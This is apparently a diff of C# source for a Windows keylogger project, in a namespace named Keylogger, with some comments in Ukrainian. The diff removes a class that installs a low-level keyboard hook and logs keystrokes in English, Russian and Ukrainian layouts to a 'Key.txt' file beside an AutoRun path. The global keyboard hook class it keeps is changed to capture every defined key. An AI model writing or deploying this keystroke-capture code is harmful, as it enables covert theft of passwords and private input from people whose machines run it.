@@ -10,6 +10,8 @@ using System.Runtime.InteropServices;
 using System.Drawing;
 using System.Windows.Interop;
 using System.Collections.Generic;
+using System.Diagnostics;
+using System.Windows.Input;
 
 
 namespace Keylogger
@@ -89,184 +91,36 @@ namespace Keylogger
 
     #endregion
 
+   
     #region Keylogger
-      
-    internal class Keylog
-    {
-        private const int WH_KEYBOARD_LL = 13;
-
-        private StringBuilder sb = new StringBuilder();
-        private LowLevelKeyboardProcDelegate m_callback;
-        private IntPtr m_hHook;
-
-
-        [DllImport("user32.dll", SetLastError = true)]
-        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProcDelegate lpfn,
-            IntPtr hMod, int dwThreadId);
-
-        [DllImport("user32.dll", SetLastError = true)]
-        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
-        [DllImport("Kernel32.dll", SetLastError = true)]
-        private static extern IntPtr GetModuleHandle(IntPtr lpModuleName);
-
-        [DllImport("user32.dll", SetLastError = true)]
-        private static extern IntPtr CallNextHookEx(
-            IntPtr hhk,
-            int nCode, IntPtr wParam, IntPtr lParam);
-
-        private static readonly char[] EKey = new char[] {'A', 'S', 'D', 'F', 'Q', 'W', 'E', 'R',
-            'T', 'Y', 'U', 'I', 'O', 'P', '[', ']', 'G', 'H', 'J',  'K', 'L', ';', '\'',
-            '`', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', ',', '.', '/',
-            '1', '2', '3', '4', '5', '6', '7', '8', '9', '0' };
-        private static readonly char[] RKey = new char[] { 'Ф', 'Ы', 'В', 'А', 'Й', 'Ц', 'У', 'К', 'Е',
-            'Н', 'Г', 'Ш', 'Щ', 'З', 'Х', 'Ъ', 'П', 'Р', 'О', ' ', 'Л', 'Д', 'Ж', 'Э', 'Ё', 'Я',
-            'Ч', 'С', 'М', 'И', 'Т', 'Ь', 'Б', 'Ю', '.',
-            '1', '2', '3', '4', '5', '6', '7', '8', '9', '0'};
-        private  static readonly char[] UKey = new char[]{
-            'Й', 'Ц', 'У', 'К', 'Е', 'Н', 'Г', 'Ш', 'Щ', 'З', 'Х', 'Ї', 'Ф', 'І', 'В', 'А', 'П',
-            'Р', 'О', 'Л', 'Д', 'Ж', 'Є', 'Я', 'Ч', 'С', 'М', 'И', 'Т', 'Ь', 'Б', 'Ю', '.',
-            '1', '2', '3', '4', '5', '6', '7', '8', '9', '0'};
-        private  static readonly int [] Ikey = new int[] {}; 
-        private IntPtr LowLevelKeyboardHookProc(
-            int nCode, IntPtr wParam, IntPtr lParam)
-        {
-            if (nCode < 0)
-            {
-                return CallNextHookEx(m_hHook, nCode, wParam, lParam);
-            }
-            else
-            {
-                var khs = (KeyboardHookStruct)
-                          Marshal.PtrToStructure(lParam,
-                          typeof(KeyboardHookStruct));
-
-                //Debug.Print("Hook: Code: {0}, WParam: {1},{2},{3},{4} ",
-                //            nCode, wParam, lParam,
-                //            khs.VirtualKeyCode,
-                //            khs.ScanCode, khs.Flags, khs.Time);
-                
-
-                //Debug.Print(khs.VirtualKeyCode.ToString());
-                //MessageBox.Show(khs.VirtualKeyCode.ToString());
-                FileStream fs = null;
-                FileInfo fi = null;
-                StreamWriter sw = null;
-                string ilm = InputLanguageManager.Current.CurrentInputLanguage.ToString();
-                
-                try
-                {
-                    fi = new FileInfo(AutoRun.Path() + "Key.txt");
-                    fs = fi.Open(FileMode.OpenOrCreate, FileAccess.Write, FileShare.Write);
-                    sw = new StreamWriter(fs);
-                    //MessageBox.Show(ilm);
-                    //string str = khs.VirtualKeyCode.ToString();
-                    if (ilm == "en-US")
-                    {
-                        for (int i = 0; i < EKey.Length; i++)
-                        {
-                            //MessageBox.Show("ENG");
-                            if (khs.VirtualKeyCode == EKey[i])
-                            {
-                               // MessageBox.Show("EKEY: " + EKey[i] + "VKC: " + khs.VirtualKeyCode);
-                                sw.WriteLine(sb.Append(EKey[i]));
-                            }
-                        }
-                    }
-                    else if (ilm == "ru-RU")
-                    {
-                        for (int i = 0; i < RKey.Length; i++)
-                        {
-                            
-                            if (khs.VirtualKeyCode == RKey[i])
-                                sw.WriteLine(sb.Append(RKey[i]));
-                        }
-                    }
-                    else if(ilm == "uk-UA")
-                    {
-                        for (int i = 0; i < UKey.Length; i++)
-                        {
-                            //MessageBox.Show("UKEY: " + UKey[i] + "VKC: " + khs.VirtualKeyCode);
-                            if (khs.VirtualKeyCode   == UKey[i])
-                            {
-                                sw.WriteLine(sb.Append(UKey[i]));
-                                //MessageBox.Show("UKR"); не працює
-                            }
-                        }
-                    }
-
-                }
-
-                catch (Exception ex)
-                {
-                    MessageBox.Show(ex.ToString());
-                }
-
-                finally
-                {
-                    sw.Close();
-                }
-
-                return CallNextHookEx(m_hHook, nCode, wParam, lParam);
-
-                //if (khs.VirtualKeyCode == 9 &&
-                //    wParam.ToInt32() == 260 &&
-                //    khs.ScanCode == 15) //alt+tab
-                //{
-
-                //    System.Console.WriteLine("Alt+Tab pressed!");
-                //    IntPtr val = new IntPtr(1);
-                //    return val;
-                //}
-                //else
-                //{
-                //    return CallNextHookEx(m_hHook, nCode, wParam, lParam);
-                //}
-
-            }
-        }
-
-
-        [StructLayout(LayoutKind.Sequential)]
-        private struct KeyboardHookStruct
-        {
-            public readonly int VirtualKeyCode;
-            public readonly int ScanCode;
-            public readonly int Flags;
-            public readonly int Time;
-            public readonly IntPtr ExtraInfo;
-        }
-
-
-        private delegate IntPtr LowLevelKeyboardProcDelegate(
-            int nCode, IntPtr wParam, IntPtr lParam);
-
-
-        public void SetHook()
-        {
-            m_callback = LowLevelKeyboardHookProc;
-            m_hHook = SetWindowsHookEx(WH_KEYBOARD_LL,
-                m_callback,
-                GetModuleHandle(IntPtr.Zero), 0);
-        }
-
-
-        public void Unhook()
-        {
-            UnhookWindowsHookEx(m_hHook);
-        }
-
-
-    }
-    #endregion
-
-    #region TESTS
 
     class globalKeyboardHook
     {
         #region Constant, Structure and Delegate Definitions
 
         public delegate int keyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);
+
+        //************************************************************************
+
+        //[DllImport("user32.dll")]
+        //private static extern bool PostMessage(int hhwnd, uint msg, IntPtr wparam, IntPtr lparam);
+
+        //[DllImport("user32.dll")]
+        //private static extern IntPtr LoadKeyboardLayout(string pwszKLID, uint Flags);
+
+        //private static uint WM_INPUTLANGCHANGEREQUEST = 0x0050;
+        //private static int HWND_BROADCAST = 0xffff;
+        //private static string en_US = "00000409";
+        //private static string ru_RU = "00000419";
+        //private static string uk_UA = "00000422";
+        //private static uint KLF_ACTIVATE = 1;
+
+        //private static void ChangeLanguage()
+        //{
+        //    PostMessage(HWND_BROADCAST, WM_INPUTLANGCHANGEREQUEST, IntPtr.Zero, LoadKeyboardLayout(en_US, KLF_ACTIVATE));
+        //}
+
+        //**********************************************************************
 
         public struct keyboardHookStruct
         {
@@ -329,8 +183,13 @@ namespace Keylogger
 
         public void hook()
         {
-            IntPtr hInstance = LoadLibrary("User32");
-            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, khp, hInstance, 0);
+            //IntPtr hInstance = LoadLibrary("User32");
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule)
+            {
+                hhook = SetWindowsHookEx(WH_KEYBOARD_LL, khp, GetModuleHandle(curModule.ModuleName), 0);
+               // MessageBox.Show(curModule.ToString());
+            }
         }
 
 
@@ -343,14 +202,20 @@ namespace Keylogger
         {
             if (code >= 0)
             {
+                //розкладка
                 System.Windows.Forms.Keys key = (System.Windows.Forms.Keys)lParam.vkCode;
-                if (_hookAll ? true : HookedKeys.Contains(key))
+                //if()
+                //MessageBox.Show(key.ToString());
+                if (_hookAll ? true : Enum.IsDefined(typeof(System.Windows.Forms.Keys), key)/*HookedKeys.Contains(key)*/)
                 {
+                    //
+                    //MessageBox.Show(HookedKeys.Count.ToString());
                     System.Windows.Forms.KeyEventArgs kea = new System.Windows.Forms.KeyEventArgs(key);
                     if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && (KeyDown != null))
                     {
                         KeyDown(this, kea);
                     }
+                    
                     else if ((wParam == WM_KEYUP || wParam == WM_SYSKEYUP) && (KeyUp != null))
                     {
                         KeyUp(this, kea);
@@ -395,6 +260,10 @@ namespace Keylogger
         /// <returns>A handle to the library</returns>
         [DllImport("kernel32.dll")]
         static extern IntPtr LoadLibrary(string lpFileName);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
         #endregion
     }
 
